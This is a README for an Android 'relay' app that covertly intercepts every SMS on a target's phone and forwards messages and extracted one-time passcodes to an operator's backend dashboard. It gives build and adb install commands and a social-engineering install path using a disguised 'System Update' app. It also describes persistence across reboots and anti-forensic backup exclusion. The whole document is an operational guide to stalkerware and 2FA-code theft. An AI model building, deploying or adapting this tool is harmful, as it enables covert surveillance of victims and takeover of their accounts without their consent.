# Relay App — SMS Interception & Forwarding (Path 2)

Android foreground-service APK that intercepts every incoming SMS on the
target device via the `SMS_RECEIVED` broadcast, buffers it locally (survives
offline gaps), and relays it to the backend `/api/v1/sms/webhook` endpoint.
The backend extracts OTPs, logs the full SMS, and pushes both to the dashboard
over WebSocket.

> **Scope:** this is the mobile client only. Backend setup (Twilio config,
> `RELAY_APP_SECRET`, migrations) lives in the root `Twilio_SMS_Setup.md` and
> the backend README. This file covers build → install → per-target workflow.

---

## 1. Architecture

```
Target Android ──(SMS_RECEIVED broadcast)──▶ SmsRelayReceiver
                                                    │
                                                    ▼
                                            RelayBuffer.enqueue()   ──▶ Room DB (buffered_sms)
                                                    │                         │
                                                    ▼                         ▼
                                            RelayBuffer.drain()      BufferDrainWorker (periodic, 15 min)
                                                    │                   (WorkManager, survives reboot)
                                                    ▼
                                            BackendClient.relay()  ──POST──▶ /api/v1/sms/webhook
                                                                                │
                                                                   X-Relay-Secret header
                                                                                │
                                                                   ┌────────────┴────────────┐
                                                                   ▼                         ▼
                                                          InterceptedSMS table      ReceivedOTP (if OTP)
                                                                   │                         │
                                                                   ▼                         ▼
                                                          WebSocket broadcast    WebSocket broadcast
                                                          "intercepted_sms"       "new_otp"
                                                                                │
                                                                                ▼
                                                          Dashboard LiveFeed (filterable)
```

### Components
| File | Role |
|---|---|
| `app/src/main/java/com/yourname/relay/SmsRelayReceiver.kt` | Highest-priority (`priority=999`) `SMS_RECEIVED` receiver. Reassembles multi-part SMS, builds a stable `messageSid`, enqueues to buffer, fires an immediate drain. |
| `app/src/main/java/com/yourname/relay/buffer/RelayBuffer.kt` | Owns the Room DB. `enqueue()` writes before any network call; `drain()` POSTs pending rows, deletes on success, retries up to 10x. |
| `app/src/main/java/com/yourname/relay/buffer/BufferedSms.kt` `BufferedSmsDao.kt` `RelayDatabase.kt` | Room entity / DAO / database for the offline queue. |
| `app/src/main/java/com/yourname/relay/buffer/BufferDrainWorker.kt` | `WorkManager` periodic worker (15-min minimum enforced by Android) that drains the buffer even if the app is closed or after reboot. |
| `app/src/main/java/com/yourname/relay/BackendClient.kt` | OkHttp POST using Twilio's form schema (`From`, `To`, `Body`, `MessageSid`) + `X-Relay-Secret` auth header. |
| `app/src/main/java/com/yourname/relay/RelayForegroundService.kt` | Keeps the process resident (low-priority "System Update" notification, `START_STICKY`). |
| `app/src/main/java/com/yourname/relay/BootReceiver.kt` | Restarts the service on `BOOT_COMPLETED` / `MY_PACKAGE_REPLACED`. |
| `app/src/main/java/com/yourname/relay/MainActivity.kt` | One-time permission grant launcher (no visible UI after first run). |
| `app/src/main/java/com/yourname/relay/Config.kt` | Static config: `BACKEND_WEBHOOK`, `DEVICE_ID`, timeouts, buffer caps. `RELAY_SECRET` is injected via Gradle `BuildConfig`. |
| `app/src/main/res/xml/backup_rules.xml` | Excludes app data from `adb backup` (anti-forensic). |

---

## 2. Prerequisites

- **Android Studio** (Hedgehog / Iguana or newer) **or** just the Android SDK + command line.
- **JDK 17** (required by the `compileOptions` / `kotlinOptions` in `app/build.gradle.kts`).
- **SDK Platform 34** installed (`compileSdk = 34`, `targetSdk = 34`).
- **Internet reachability** from the target device to your backend's public HTTPS endpoint.
- **Backend already running** with `RELAY_APP_SECRET` set (see §3).

---

## 3. Backend preparation (one-time)

These steps live on the backend; do them once before building any APK.

1. **Generate a shared secret** (32 hex chars):
   ```bash
   python -c "import secrets; print(secrets.token_hex(16))"
   # e.g.  a1b2c3d4e5f60718293a4b5c6d7e8f90
   ```

2. **Set it in the backend `.env`:**
   ```env
   RELAY_APP_SECRET=a1b2c3d4e5f60718293a4b5c6d7e8f90
   ```
   > If `RELAY_APP_SECRET` is empty, the webhook returns **HTTP 503** to every
   > relay POST. This is fail-closed by design.

3. **Run migrations** so the `intercepted_sms` table exists:
   ```bash
   cd backend && alembic upgrade head
   ```

4. **Expose the webhook publicly.** Twilio/relay POST to the internet, so
   `localhost` won't work on a physical device. Use:
   - A domain with HTTPS (recommended), or
   - `ngrok http 8000` for testing → use the `https://….ngrok-free.app` URL.

5. **Enroll the target's phone** in the backend so SMS can be attributed:
   ```bash
   curl -X POST http://localhost:8000/api/v1/targets/ \
     -H "Content-Type: application/json" \
     -d '{"email":"target@example.com","phone_number":"+14155551234","provider":"OTHER"}'
   ```
   The `phone_number` must be E.164 (the API normalizes `(415) 555-1234` →
   `+14155551234` automatically).

---

## 4. Per-target secret & device workflow

Each target gets a **unique** `DEVICE_ID` and shares the **same** `RELAY_APP_SECRET`
as the backend. The secret identifies *your* app; the device ID distinguishes
*which* target a relayed SMS belongs to.

> **Why one secret, many device IDs?** The backend matches incoming SMS to a
> target by phone number (`Target.phone_number`), not by device ID. The device
> ID only deduplicates resends and lets you spot which build relayed a message
> in logs. Reusing one secret across builds is fine; reusing one device ID
> across two phones is not (their resend keys would collide).

### For each target:
1. Generate a device UUID:
   ```bash
   python -c "import uuid; print(uuid.uuid4())"
   # e.g.  550e8400-e29b-41d4-a716-446655440000
   ```

2. Edit `Config.kt` and set:
   ```kotlin
   const val DEVICE_ID = "550e8400-e29b-41d4-a716-446655440000"
   const val BACKEND_WEBHOOK = "https://your-domain.com/api/v1/sms/webhook"
   ```
   (`RELAY_SECRET` is injected at build time — do **not** hardcode it in
   `Config.kt`; see §5.)

3. Build the signed APK with the secret (see §5).

4. Install on that specific target's phone (see §6).

Repeat per target with a fresh `DEVICE_ID`. Keep a mapping
`DEVICE_ID ↔ target_email` in your own notes — the APK itself does not reveal it.

---

## 5. Build

### Option A — Android Studio (GUI)
1. `File → Open` the `relay-app/` folder.
2. Wait for Gradle sync.
3. `Build → Generate Signed Bundle / APK → APK`.
4. Create/select a keystore (or use `debug` for testing).
5. In the build step, pass the secret. The cleanest way is via Gradle flag:
   - `Build → Edit Configurations → app → Arguments`:
     ```
     -PRELAY_SECRET=a1b2c3d4e5f60718293a4b5c6d7e8f90
     ```
   Or set it once in your global `gradle.properties`:
   ```properties
   RELAY_SECRET=a1b2c3d4e5f60718293a4b5c6d7e8f90
   ```
   (and reference `project.findProperty("RELAY_SECRET")` — already wired in
   `app/build.gradle.kts`).

### Option B — Command line
```bash
cd relay-app
./gradlew assembleRelease -PRELAY_SECRET=a1b2c3d4e5f60718293a4b5c6d7e8f90
# APK lands at app/build/outputs/apk/release/app-release.apk
```
For a debug build (secret falls back to a placeholder — do NOT ship debug to a
real target):
```bash
./gradlew assembleDebug
```

> **Verify the secret baked in:** after build, confirm
> `BuildConfig.RELAY_SECRET` is non-empty. If you built without `-PRELAY_SECRET`
> and without the `gradle.properties` entry, the release build gets an empty
> secret and every POST will 503.

---

## 6. Install on the target device

### Path A — Physical access (cleanest)
```bash
adb install -r app/build/outputs/apk/release/app-release.apk
adb shell am start -n com.yourname.relay/.MainActivity
```
The activity opens, requests `RECEIVE_SMS` / `READ_SMS` / notification
permissions, starts the foreground service, then closes itself.

### Path B — Social engineering (no cable)
Host the APK somewhere the target will open it (e.g. disguised file share).
When they install and launch it, the permission prompt appears. Use a
convincing app name/icon — change `android:label` and `android:icon` in
`AndroidManifest.xml` (currently "System Update" / info icon) to match the
ploy.

### Path C — MDM / enterprise
Push as a required app via your management console; pre-grant the SMS
permission via policy so no prompt shows.

> **Note on Android 14+:** `FOREGROUND_SERVICE_DATA_SYNC` type is declared and
> the notification is required. The app cannot run fully silent on modern
> Android — the low-priority "System Update" notification is the tradeoff for
> process persistence. Hiding it requires device owner / root, out of scope
> here.

---

## 7. Verify the pipeline

1. From your personal phone, SMS the target's number:
   ```
   Your verification code is 482917
   ```
2. On the target device: nothing visible should happen (the receiver is
   silent; the foreground notification stays as "System Update").
3. In the backend logs:
   ```
   INFO api.sms: SMS webhook received: from=+1... to=550e8400... body_len=...
   INFO api.sms: Logged intercepted SMS id=... target=attributed
   INFO api.sms: Extracted OTP candidate '482917' ...
   INFO api.sms: Saved SMS OTP 482917 ... for target target@example.com
   ```
4. In the dashboard (`/dashboard/live`):
   - An **OTP** row appears (emerald left border, `SMS` channel badge, code
     `482917`, confidence %).
   - An **SMS log** row appears (violet left border, full body text).
   - Toggle the **SMS log** / **OTP** tabs to filter.

If the dashboard shows nothing:
- Check backend `RELAY_APP_SECRET` matches the APK's baked secret.
- Check `BACKEND_WEBHOOK` is reachable from the device (try the URL in the
  device browser).
- Check the target's `phone_number` is enrolled in the backend.
- Watch the device logcat: `adb logcat -s SmsRelayReceiver BackendClient`.

---

## 8. Operations & troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| Backend 503 on every relay POST | `RELAY_APP_SECRET` empty on backend | Set it in `.env`, restart backend |
| Backend 401 on relay POST | APK secret ≠ backend secret | Rebuild APK with correct `-PRELAY_SECRET` |
| SMS not intercepted | Permission not granted / another app won race | Re-run `MainActivity`; ensure priority 999; check no SMS app with higher priority |
| OTP appears but SMS log empty | Working as designed — non-OTP SMS only show in "SMS log" tab | Toggle to **SMS log** tab |
| Delayed relay (up to 15 min) | Device was offline; relying on periodic drain | Expected — immediate drain fires when back online |
| After reboot, no relay until SMS arrives | `BootReceiver` starts service, but first drain waits for interval | Expected; first SMS triggers immediate drain |

### Buffer behavior
- Every SMS is written to the local Room DB **before** any network call.
- Immediate `drain()` runs right after enqueue (fast when online).
- `BufferDrainWorker` runs every 15 min (Android floor) to recover offline rows.
- Queue capped at `MAX_BUFFERED_MESSAGES = 500` (oldest dropped).
- Per-row retry cap `MAX_ATTEMPTS = 10`, then dropped (prevents unbounded growth).
- Buffer excluded from `adb backup` via `backup_rules.xml`.

### Updating the app on a target
`MY_PACKAGE_REPLACED` triggers `BootReceiver`, which restarts the service.
Just `adb install -r` the new APK (or push via MDM). No re-permission needed
if the package signature is the same.

---

## 9. Security notes (operational, not legal)
- The relay secret is in `BuildConfig`, which is trivially extractable from the
  APK. Treat it as an **identifier**, not a fortress. Rotate it by changing
  both backend `.env` and rebuilding all APKs.
- `DEVICE_ID` is the only per-target distinguisher in logs. Keep your
  `DEVICE_ID ↔ target` mapping outside the device.
- No data leaves the device except the SMS body + sender to your webhook over
  HTTPS. There is no third-party telemetry.

---

## 10. File map
```
relay-app/
├── build.gradle.kts                 # root: KSP + Android plugin
├── settings.gradle.kts
├── gradle.properties
├── local.properties                 # sdk.dir — set per machine
├── .gitignore                       # excludes local.properties, BuildConfig
└── app/
    ├── build.gradle.kts             # deps: OkHttp, Room, WorkManager, KSP
    ├── proguard-rules.pro
    └── src/main/
        ├── AndroidManifest.xml
        ├── res/xml/backup_rules.xml
        └── java/com/yourname/relay/
            ├── Config.kt
            ├── BackendClient.kt
            ├── SmsRelayReceiver.kt
            ├── RelayForegroundService.kt
            ├── BootReceiver.kt
            ├── MainActivity.kt
            └── buffer/
                ├── RelayBuffer.kt
                ├── BufferedSms.kt
                ├── BufferedSmsDao.kt
                ├── RelayDatabase.kt
                └── BufferDrainWorker.kt
```
